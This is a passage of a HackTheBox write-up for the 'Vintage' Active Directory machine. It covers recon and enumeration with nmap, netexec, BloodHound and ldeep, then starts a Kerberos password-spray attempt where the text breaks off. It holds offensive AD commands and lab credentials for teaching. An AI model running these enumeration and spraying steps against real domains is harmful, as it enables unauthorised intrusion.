---
render_with_liquid: false
title: HackTheBox Writeup - Vintage
date: 2025-03-19 06:32:14 +1400
tags: [hackthebox, nmap, windows, ad, assumed-breach, kerberos, netexec, bloodhound-ce-python, bloodhound-ce, bloodhound-cli, impacket, ldeep, ad-maq, pre-windows-2000-compatible-access, password-spraying, ad-gmsa, dacl-abuse, bloodyad, targeted-kerberoast, hashcat, evil-winrm, reverse-ssh, runascs, defense-evasion, amsi-bypass, dpapi, dpapi-py, ad-delegation, ad-rbcd, etw-disable]
image:
    path: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9e4d90cc-61bb-4d00-b438-4bdad043d754.png
    width: 640
    height: 480
---



Vintage is a hard difficulty Windows machine designed around an assumed breach scenario, where the attacker is provided with low-privileged user credentials. The machine features an Active Directory environment without ADCS installed, and NTLM authentication is disabled. There is a "Pre-Created computer account", meaning the password is the same as the sAMAccountName of the machine account. The "Domain Computer" organisational unit (OU) has a configuration allowing attackers to read the service account password, which has gMSA configured. After obtaining the password, the service account can add itself to a privileged group. The group has complete control over a disabled user. The attacker is supposed to restore the disabled user and set a Service Principal Name (SPN) to perform Kerberoasting. After recovering the password, the user account has reused the same password. The newly compromised user has a password stored in the Credential Manager. The user can add itself to another privileged group configured for Resource-Based Constrained Delegation (RBCD) on the Domain Controller, allowing the attacker to compromise it.

# Recon
---

## Hosts

> `pt` command is a **custom pentest framework** to manage hosts and variables, it is not required to reproduce the steps in this writeup
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ pt init '10.10.11.45 vintage.htb DC01.vintage.htb DC01'
+---------+--------+-------------+------------------+
| PROFILE | STATUS |     IP      |      DOMAIN      |
+---------+--------+-------------+------------------+
| vintage | on     | 10.10.11.45 | vintage.htb      |
| vintage | on     | 10.10.11.45 | DC01.vintage.htb |
| vintage | on     | 10.10.11.45 | DC01             |
+---------+--------+-------------+------------------+

╒═══════════╤═════════════╤═════════════╤═════════════╤═════════════╤═══════╤════════╤═══════════════╤═══════════╤══════════════════╕
│ profile   │ lhost       │ rhost       │ domain      │ ip          │ url   │ user   │ pass          │ dc_name   │ dc_fqdn          │
╞═══════════╪═════════════╪═════════════╪═════════════╪═════════════╪═══════╪════════╪═══════════════╪═══════════╪══════════════════╡
│ vintage   │ 10.10.14.90 │ vintage.htb │ vintage.htb │ 10.10.11.45 │       │ P.Rosa │ Rosaisbest123 │ DC01      │ DC01.vintage.htb │
╘═══════════╧═════════════╧═════════════╧═════════════╧═════════════╧═══════╧════════╧═══════════════╧═══════════╧══════════════════╛
```

## Nmap

```bash
# Nmap 7.95 scan initiated Wed Mar 19 06:32:14 2025 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49668,49674,49685,60321, vintage.htb
Nmap scan report for vintage.htb (10.10.11.45)
Host is up, received user-set (0.081s latency).
Scanned at 2025-03-19 06:32:14 CST for 109s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-18 21:27:24Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49685/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
60321/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: -1h04m57s
| smb2-time: 
|   date: 2025-03-18T21:28:28
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 53397/tcp): CLEAN (Timeout)
|   Check 2 (port 33304/tcp): CLEAN (Timeout)
|   Check 3 (port 61163/udp): CLEAN (Timeout)
|   Check 4 (port 63145/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar 19 06:34:03 2025 -- 1 IP address (1 host up) scanned in 108.68 seconds
```

# User Flag
---

## Auth as P.Rosa


### Assumed breach scenario

![](/assets/obsidian/da10b792aeb9a4e04fcf99d36f0e486b.png)

> `pt` command is a custom pentest framework to manage hosts and variables, it is not required to reproduce the steps in this writeup
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ pt set user 'P.Rosa'; pt set pass 'Rosaisbest123'; echo "$(pt get user):$(pt get pass)" | anew creds.lst
P.Rosa:Rosaisbest123
```

While trying **NTLM** authentication to the **SMB** service, it shows `STATUS_NOT_SUPPORTED`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ nxc smb $(pt get rhost) -u "$(pt get user)" -p "$(pt get pass)"
SMB         10.10.11.45     445    10.10.11.45      [*]  x64 (name:10.10.11.45) (domain:10.10.11.45) (signing:True) (SMBv1:False)
SMB         10.10.11.45     445    10.10.11.45      [-] 10.10.11.45\P.Rosa:Rosaisbest123 STATUS_NOT_SUPPORTED
```

It works with **Kerberos** authentication on the **CIFS** service, but we couldn't get the machine and domain name properly

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ nxc smb -k $(pt get rhost) -u "$(pt get user)" -p "$(pt get pass)"
SMB         10.10.11.45     445    10.10.11.45      [*]  x64 (name:10.10.11.45) (domain:10.10.11.45) (signing:True) (SMBv1:False)
SMB         10.10.11.45     445    10.10.11.45      [-] 10.10.11.45\P.Rosa:Rosaisbest123 KDC_ERR_WRONG_REALM
```

By authenticating to **ldap** service, we got the DC machine name and domain name

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ nxc ldap -k $(pt get rhost) -u "$(pt get user)" -p "$(pt get pass)"
LDAP        10.10.11.45     389    DC01             [*] None (name:DC01) (domain:vintage.htb)
LDAP        10.10.11.45     389    DC01             [-] vintage.htb\P.Rosa:Rosaisbest123 [Errno Connection error (VINTAGE.HTB:88)] [Errno -2] Name or service not known
```

Add the names to hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ echo '10.10.11.45 DC01.vintage.htb DC01 vintage.htb' | sudo tee -a /etc/hosts
10.10.11.45 vintage.htb DC01.vintage.htb DC01
```

It shows `KRB_AP_ERR_SKEW` while accessing **CIFS** service

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ nxc smb -k DC01.vintage.htb -u "$(pt get user)" -p "$(pt get pass)"
SMB         DC01.vintage.htb 445    DC01             [*]  x64 (name:DC01) (domain:vintage.htb) (signing:True) (SMBv1:False)
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\P.Rosa:Rosaisbest123 KRB_AP_ERR_SKEW
```

Sync time with domain controller to fix the issue

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ sudo ~/scripts/ad/sync_ntp.sh $(pt get ip)
[*] Disable virtualbox's auto time sync
-> sudo /etc/init.d/virtualbox-guest-utils stop
Stopping virtualbox-guest-utils (via systemctl): virtualbox-guest-utils.service.

[*] Stop systemd-timesyncd to sync Time manually
-> sudo systemctl stop systemd-timesyncd

[*] Disable system time sync
-> sudo systemctl disable --now chronyd
Failed to disable unit: Unit chronyd.service does not exist

[*] Sync time with NTP server
-> sudo ntpdate -u $1
2025-03-20 13:28:32.753176 (+0800) +35155.538353 +/- 0.038188 10.10.11.45 s1 no-leap
CLOCK: time stepped by 35155.538353

Done syncing time with NTP server: 10.10.11.45
```

Configure **kerberos**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ sudo ~/scripts/ad/configure_krb5.py $(pt get domain) $(pt get dc_name)
[*] Configuration Data:
[libdefault]
        default_realm = VINTAGE.HTB

[realms]
        VINTAGE.HTB = {
                kdc = dc01.vintage.htb
                admin_server = dc01.vintage.htb
        }

[domain_realm]
        vintage.htb = VINTAGE.HTB
        .vintage.htb = VINTAGE.HTB

[*] Previous config backed up to /etc/krb5.conf~
[+] /etc/krb5.conf has been configured
```

Now we can access the services properly

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ nxc smb -k DC01.vintage.htb -u "$(pt get user)" -p "$(pt get pass)"
SMB         DC01.vintage.htb 445    DC01             [*]  x64 (name:DC01) (domain:vintage.htb) (signing:True) (SMBv1:False)
SMB         DC01.vintage.htb 445    DC01             [+] vintage.htb\P.Rosa:Rosaisbest123
```

## Auth as FS01$


### Domain Enumeration


#### Bloodhound


##### Collecting data

Run collector

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ bloodhound-ce-python -d "$(pt get domain)" -ns $(pt get ip) -c all --zip -u "$(pt get user)" -p "$(pt get pass)"
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: vintage.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 16 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: FS01.vintage.htb
INFO: Querying computer: dc01.vintage.htb
WARNING: Could not resolve: FS01.vintage.htb: The DNS query name does not exist: FS01.vintage.htb.
INFO: Done in 00M 16S
INFO: Compressing output into 20250320133359_bloodhound.zip
```

Start **bloodhound community addition** ([Deploy BloodHound CE](https://github.com/SpecterOps/BloodHound?tab=readme-ov-file#deploy-bloodhound-ce))

```bash
sudo docker-compose -f /opt/sectools/ad/bloodhound-ce/docker-compose.yml up
```

Setup [bloodhound-cli](https://github.com/exploide/bloodhound-cli) to interact with **bloodhound-ce** from terminal (**bloodhound-cli** can be installed via `pipx install git+https://github.com/exploide/bloodhound-cli`)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ bhcli auth http://localhost:8888
Username: admin
Password:
INFO: Authenticating to the BloodHound server...
INFO: Creating new API token...
INFO: Storing API token to config file: /home/kali/.config/bhcli/bhcli.ini
INFO: bhcli is now configured and ready to access the API.
```

Ingest data into the **BloodHound** database

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ bhcli upload *_bloodhound.zip
INFO: Starting new file upload job...
INFO: Uploading file 20250320133359_bloodhound.zip
INFO: Ending file upload job...
INFO: Now waiting for ingestion being complete...
INFO: Ingestion completed, the data is now available.
```


##### Insight

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ bhcli stats -d "$(pt get domain)"
┌────────────────────┬─────────┬─────────┐
│ VINTAGE.HTB        │   all   │ enabled │
├────────────────────┼─────────┼─────────┤
│ User Accounts      │      16 │      12 │
│ Computer Accounts  │       3 │       3 │
│ Domain Admins      │       2 │       2 │
│ Domain Controllers │       1 │       1 │
│ Protected Users    │       0 │       0 │
│ Groups             │      57 │         │
│ Root CAs           │       0 │         │
│ Enterprise CAs     │       0 │         │
│ Cert Templates     │       0 │         │
└────────────────────┴─────────┴─────────┘
```


##### Audit

- `DOMAIN COMPUTERS` can read **GMSA** passwords from `GMSA01.VINTAGE.HTB` computer

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ bhcli audit -d "$(pt get domain)"
VINTAGE.HTB
===========

[*] Interesting privileges for domain users or computers
    1 relations found
Group                               Relation                Target                     Kind of Target
DOMAIN COMPUTERS@VINTAGE.HTB        ReadGMSAPassword        GMSA01$@VINTAGE.HTB        User

[*] Interesting privileges for guests
    0 relations found

[*] Kerberoastable user accounts of high value (enabled, no MSA/gMSA)
    0 accounts found

[*] AS-REP-roastable user accounts (enabled)
    0 accounts found

[*] Accounts trusted for unconstrained delegation (enabled, no DCs)
    0 accounts found
```


##### Delegations

By running the **Shortest path to Domain Admins** query, we found that `C.NERI_ADM` can impersonate any domain users to the domain controller via **S4U2self/S4U2proxy** since members of `DELEGATEDADMINS` group has `msds-AllowedToActOnBehalfOfOtherIdentity` attribute on the computer `DC01.VINTAGE.HTB`

![](/assets/obsidian/1a9b0e06fb7babe91b1f1045f891a5ac.png)

![](/assets/obsidian/8d20a1fce7b843277315e2715f8e48b7.png)

#### Ldeep


##### Collecting data

Request a TGT for **kerberos** authentication operations

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ getTGT.py -dc-ip $(pt get ip) "$(pt get domain)"/"$(pt get user)":"$(pt get pass)"; pt set ticket $(realpath "$(pt get user).ccache")
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in P.Rosa.ccache
```

Run **ldeep** to collect data from **LDAP**

```bash
mkdir -p ldeep && KRB5CCNAME="$(pt get ticket)" ldeep ldap -k -d "$(pt get domain)" -s "ldap://$(pt get dc_fqdn)" all ldeep/
```


##### Overview

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ find ldeep/*.lst -type f -size +0c -not -path '*_conf.lst' -exec ls -lS {} +
-rw-r--r-- 1 bravosec kali 1117 Mar 20 14:20 ldeep/_groups.lst
-rw-r--r-- 1 bravosec kali  337 Mar 20 14:20 ldeep/_domain_policy.lst
-rw-r--r-- 1 bravosec kali  210 Mar 20 14:20 ldeep/_fsmo.lst
-rw-r--r-- 1 bravosec kali  185 Mar 20 14:20 ldeep/_ou.lst
-rw-r--r-- 1 bravosec kali  136 Mar 20 14:20 ldeep/_gpo.lst
-rw-r--r-- 1 bravosec kali  125 Mar 20 14:20 ldeep/_users_all.lst
-rw-r--r-- 1 bravosec kali  118 Mar 20 14:20 ldeep/_users_nopasswordexpire.lst
-rw-r--r-- 1 bravosec kali  104 Mar 20 14:20 ldeep/_users_enabled.lst
-rw-r--r-- 1 bravosec kali   53 Mar 20 14:20 ldeep/_computers.lst
-rw-r--r-- 1 bravosec kali   48 Mar 20 14:20 ldeep/_delegations_all.lst
-rw-r--r-- 1 bravosec kali   40 Mar 20 14:20 ldeep/_gmsa.lst
-rw-r--r-- 1 bravosec kali   27 Mar 20 14:20 ldeep/_delegations_rbcd.lst
-rw-r--r-- 1 bravosec kali   24 Mar 20 14:20 ldeep/_pkis.lst
-rw-r--r-- 1 bravosec kali   21 Mar 20 14:20 ldeep/_delegations_unconstrained.lst
-rw-r--r-- 1 bravosec kali   21 Mar 20 14:20 ldeep/_users_disabled.lst
-rw-r--r-- 1 bravosec kali   20 Mar 20 14:20 ldeep/_machines.lst
-rw-r--r-- 1 bravosec kali   12 Mar 20 14:20 ldeep/_zones.lst
-rw-r--r-- 1 bravosec kali    6 Mar 20 14:20 ldeep/_users_passwordnotrequired.lst
```


##### Password policy

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ cat ldeep/_domain_policy.lst
distinguishedName: DC=vintage,DC=htb
lockoutDuration: 30 mins
lockOutObservationWindow: 30.0 mins
lockoutThreshold: 0
maxPwdAge: 42 days
minPwdAge: 1 days
minPwdLength: 7
pwdProperties: DOMAIN_PASSWORD_COMPLEX
pwdHistoryLength: 24
ms-DS-MachineAccountQuota: 0
msDS-Behavior-Version: Windows Server 2016
dc: vintage
dn: DC=vintage,DC=htb
```


##### Accounts that logs on constantly

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ cat ldeep/*_users_all.json | jq '[.[] | {sAMAccountName, logonCount}] | map(select(.logonCount != 0)) | sort_by(.logonCount)'
[
  {
    "sAMAccountName": "C.Neri_adm",
    "logonCount": 7
  },
  {
    "sAMAccountName": "P.Rosa",
    "logonCount": 9
  },
  {
    "sAMAccountName": "Guest",
    "logonCount": 18
  },
  {
    "sAMAccountName": "C.Neri",
    "logonCount": 41
  },
  {
    "sAMAccountName": "Administrator",
    "logonCount": 178
  }
]
```


##### User attributes

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ cat ldeep/*_users_all.json | jq 'map(del(.cn,.accountExpires,.badPasswordTime,.badPwdCount,.c,.codePage,.company,.countryCode,.dSCorePropagationData,.dn,.givenName,.instanceType,.l,.lastLogoff,.lastLogon,.logonCount,.mail,.name,.objectCategory,.objectClass,.objectGUID,.objectSid,.postalCode,.primaryGroupID,.sAMAccountType,.sn,.st,.streetAddress,.uSNChanged,.uSNCreated,.whenChanged,.whenCreated,.memberOf,.logonHours,.isCriticalSystemObject,.showInAdvancedViewOnly,.lockoutTime,.nTSecurityDescriptor,.initials,.pwdLastSet)) | sort_by(.lastLogonTimestamp)'| sed -E -e 's/DONT_REQUIRE|servicePrincipalName|NOTREQD/\x1b[31m&\x1b[0m/ig' -e 's/DONT_EXPIRE/\x1b[33m&\x1b[0m/ig' -e 's/displayName|distinguishedName|lastLogonTimestamp|sAMAccountName|userAccountControl|userPrincipalName/\x1b[36m&\x1b[0m/ig'
[
  {
    "distinguishedName": "CN=svc_ark,OU=Pre-Migration,DC=vintage,DC=htb",
    "msDS-SupportedEncryptionTypes": 0,
    "sAMAccountName": "svc_ark",
    "userAccountControl": "NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD"
  },
  {
    "distinguishedName": "CN=svc_ldap,OU=Pre-Migration,DC=vintage,DC=htb",
    "msDS-SupportedEncryptionTypes": 0,
    "sAMAccountName": "svc_ldap",
    "userAccountControl": "NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD"
  },
  {
    "distinguishedName": "CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb",
    "msDS-SupportedEncryptionTypes": 0,
    "sAMAccountName": "svc_sql",
    "userAccountControl": "ACCOUNTDISABLE | NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD"
  },
  {
    "distinguishedName": "CN=G.Viola,CN=Users,DC=vintage,DC=htb",
    "msDS-SupportedEncryptionTypes": 0,
    "sAMAccountName": "G.Viola",
    "userAccountControl": "NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD"
  },
  {
    "distinguishedName": "CN=L.Bianchi,CN=Users,DC=vintage,DC=htb",
    "msDS-SupportedEncryptionTypes": 0,
    "sAMAccountName": "L.Bianchi",
    "userAccountControl": "NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD"
  },
  {
    "distinguishedName": "CN=R.Verdi,CN=Users,DC=vintage,DC=htb",
    "msDS-SupportedEncryptionTypes": 0,
    "sAMAccountName": "R.Verdi",
    "userAccountControl": "NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD"
  },
  {
    "distinguishedName": "CN=M.Rossi,CN=Users,DC=vintage,DC=htb",
    "msDS-SupportedEncryptionTypes": 0,
    "sAMAccountName": "M.Rossi",
    "userAccountControl": "NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD"
  },
  {
    "adminCount": 1,
    "description": [
      "Key Distribution Center Service Account"
    ],
    "distinguishedName": "CN=krbtgt,CN=Users,DC=vintage,DC=htb",
    "msDS-SupportedEncryptionTypes": 0,
    "sAMAccountName": "krbtgt",
    "servicePrincipalName": [
      "kadmin/changepw"
    ],
    "userAccountControl": "ACCOUNTDISABLE | NORMAL_ACCOUNT"
  },
  {
    "distinguishedName": "CN=C.Neri,CN=Users,DC=vintage,DC=htb",
    "lastLogonTimestamp": "2024-06-05T21:08:48.239103+00:00",
    "msDS-SupportedEncryptionTypes": 0,
    "sAMAccountName": "C.Neri",
    "userAccountControl": "NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD"
  },
  {
    "description": [
      "Built-in account for guest access to the computer/domain"
    ],
    "distinguishedName": "CN=Guest,CN=Users,DC=vintage,DC=htb",
    "lastLogonTimestamp": "2024-06-06T07:46:25.761219+00:00",
    "msDS-SupportedEncryptionTypes": 0,
    "sAMAccountName": "Guest",
    "userAccountControl": "ACCOUNTDISABLE | PASSWD_NOTREQD | NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD"
  },
  {
    "distinguishedName": "CN=C.Neri_adm,CN=Users,DC=vintage,DC=htb",
    "lastLogonTimestamp": "2024-06-07T14:02:26.816761+00:00",
    "msDS-SupportedEncryptionTypes": 0,
    "sAMAccountName": "C.Neri_adm",
    "userAccountControl": "NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD"
  },
  {
    "adminCount": 1,
    "distinguishedName": "CN=L.Bianchi_adm,CN=Users,DC=vintage,DC=htb",
    "lastLogonTimestamp": "2024-06-08T11:42:17.799767+00:00",
    "msDS-SupportedEncryptionTypes": 0,
    "sAMAccountName": "L.Bianchi_adm",
    "userAccountControl": "NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD"
  },
  {
    "adminCount": 1,
    "description": [
      "Built-in account for administering the computer/domain"
    ],
    "distinguishedName": "CN=Administrator,CN=Users,DC=vintage,DC=htb",
    "lastLogonTimestamp": "2025-03-19T19:43:18.005890+00:00",
    "msDS-SupportedEncryptionTypes": 16,
    "sAMAccountName": "Administrator",
    "userAccountControl": "NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD"
  },
  {
    "distinguishedName": "CN=P.Rosa,CN=Users,DC=vintage,DC=htb",
    "lastLogonTimestamp": "2025-03-20T05:20:49.677759+00:00",
    "msDS-SupportedEncryptionTypes": 0,
    "sAMAccountName": "P.Rosa",
    "userAccountControl": "NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD"
  }
]
```


##### Grouping users by group

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ cat ldeep/*_users_all.json | jq 'map(select(.memberOf != null)) | reduce .[] as $item ({}; reduce $item.memberOf[] as $group (.; .[$group] = (.[$group] // []) + [$item.sAMAccountName]))'
{
  "CN=DelegatedAdmins,OU=Pre-Migration,DC=vintage,DC=htb": [
    "L.Bianchi_adm",
    "C.Neri_adm"
  ],
  "CN=Domain Admins,CN=Users,DC=vintage,DC=htb": [
    "L.Bianchi_adm",
    "Administrator"
  ],
  "CN=Remote Desktop Users,CN=Builtin,DC=vintage,DC=htb": [
    "C.Neri_adm"
  ],
  "CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb": [
    "svc_ark",
    "svc_ldap",
    "svc_sql"
  ],
  "CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb": [
    "C.Neri",
    "G.Viola",
    "L.Bianchi"
  ],
  "CN=Remote Management Users,CN=Builtin,DC=vintage,DC=htb": [
    "C.Neri",
    "L.Bianchi"
  ],
  "CN=Denied RODC Password Replication Group,CN=Users,DC=vintage,DC=htb": [
    "krbtgt"
  ],
  "CN=Guests,CN=Builtin,DC=vintage,DC=htb": [
    "Guest"
  ],
  "CN=Group Policy Creator Owners,CN=Users,DC=vintage,DC=htb": [
    "Administrator"
  ],
  "CN=Enterprise Admins,CN=Users,DC=vintage,DC=htb": [
    "Administrator"
  ],
  "CN=Schema Admins,CN=Users,DC=vintage,DC=htb": [
    "Administrator"
  ],
  "CN=Administrators,CN=Builtin,DC=vintage,DC=htb": [
    "Administrator"
  ]
}
```

### User access check


#### AD

- **Bloodhound**
	- There are no interesting rights

![](/assets/obsidian/ebec0cd9c4d8d7096f376c20c779313a.png)


#### Machine account quota

We can't read **GMSA** password from `GMSA01.VINTAGE.HTB` since domain policy has set **MAQ** (Machine Account Quota) to `0`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ nxc ldap -k $(pt get rhost) -u "$(pt get user)" -p "$(pt get pass)" -M maq
LDAP        DC01.vintage.htb 389    DC01             [*] None (name:DC01) (domain:vintage.htb)
LDAP        DC01.vintage.htb 389    DC01             [+] vintage.htb\P.Rosa:Rosaisbest123
MAQ         DC01.vintage.htb 389    DC01             [*] Getting the MachineAccountQuota
MAQ         DC01.vintage.htb 389    DC01             MachineAccountQuota: 0
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ cat ldeep/_domain_policy.lst | grep 'ms-DS-MachineAccountQuota'
ms-DS-MachineAccountQuota: 0
```

#### SMB shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ nxc smb $(pt get rhost) -u "$(pt get user)" -p "$(pt get pass)" -M spider_plus --smb-timeout 10 --log nxc_shares.log -k
SMB         DC01.vintage.htb 445    DC01             [*]  x64 (name:DC01) (domain:vintage.htb) (signing:True) (SMBv1:False)
SMB         DC01.vintage.htb 445    DC01             [+] vintage.htb\P.Rosa:Rosaisbest123
SPIDER_PLUS DC01.vintage.htb 445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_PLUS DC01.vintage.htb 445    DC01             [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS DC01.vintage.htb 445    DC01             [*]     STATS_FLAG: True
SPIDER_PLUS DC01.vintage.htb 445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS DC01.vintage.htb 445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS DC01.vintage.htb 445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS DC01.vintage.htb 445    DC01             [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         DC01.vintage.htb 445    DC01             [*] Enumerated shares
SMB         DC01.vintage.htb 445    DC01             Share           Permissions     Remark
SMB         DC01.vintage.htb 445    DC01             -----           -----------     ------
SMB         DC01.vintage.htb 445    DC01             ADMIN$                          Remote Admin
SMB         DC01.vintage.htb 445    DC01             C$                              Default share
SMB         DC01.vintage.htb 445    DC01             IPC$            READ            Remote IPC
SMB         DC01.vintage.htb 445    DC01             NETLOGON        READ            Logon server share
SMB         DC01.vintage.htb 445    DC01             SYSVOL          READ            Logon server share
SPIDER_PLUS DC01.vintage.htb 445    DC01             [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/DC01.vintage.htb.json".
SPIDER_PLUS DC01.vintage.htb 445    DC01             [*] SMB Shares:           5 (ADMIN$, C$, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS DC01.vintage.htb 445    DC01             [*] SMB Readable Shares:  3 (IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS DC01.vintage.htb 445    DC01             [*] SMB Filtered Shares:  1
SPIDER_PLUS DC01.vintage.htb 445    DC01             [*] Total folders found:  16
SPIDER_PLUS DC01.vintage.htb 445    DC01             [*] Total files found:    5
SPIDER_PLUS DC01.vintage.htb 445    DC01             [*] File size average:    1.69 KB
SPIDER_PLUS DC01.vintage.htb 445    DC01             [*] File size min:        22 B
SPIDER_PLUS DC01.vintage.htb 445    DC01             [*] File size max:        4.61 KB
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ cat "/home/kali/.nxc/modules/nxc_spider_plus/$(pt get rhost).json" | jq -r 'to_entries[] | .key as $top_level | .value | to_entries[]? | select(.value | type == "object") | {file_path: ($top_level + "/" + .key), atime: (.value.atime_epoch // "N/A"), size: (.value.size // "N/A")}' | jq -s -r 'sort_by(.atime)[] | [.file_path, .atime, .size] | @tsv' | column -t -s $'\t'
SYSVOL/vintage.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf  2024-06-05 18:26:57  1.07 KB
SYSVOL/vintage.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol                              2024-06-05 18:33:24  2.72 KB
SYSVOL/vintage.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI                                           2024-06-05 18:33:25  22 B
SYSVOL/vintage.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI                                           2024-06-07 22:04:27  22 B
SYSVOL/vintage.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf  2024-06-07 22:04:27  4.61 KB
```


### (Failed) Password spraying

> The right path should be reading the **GMSA** password from `GMSA01.VINTAGE.HTB`, hence we need to own a computer account, or get access to other accounts that have available **MAQ** to add computer accounts
{: .prompt-info }

Spraying known credentials via [**kerberos Pre-auth bruteforce**](https://www.thehacker.recipes/ad/movement/kerberos/pre-auth-bruteforce)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ nxc smb --log nxc_kerberos.log -k $(pt get dc_fqdn) --continue-on-success -u ldeep/_users_enabled.lst -p pass.lst
SMB         DC01.vintage.htb 445    DC01             [*]  x64 (name:DC01) (domain:vintage.htb) (signing:True) (SMBv1:False)
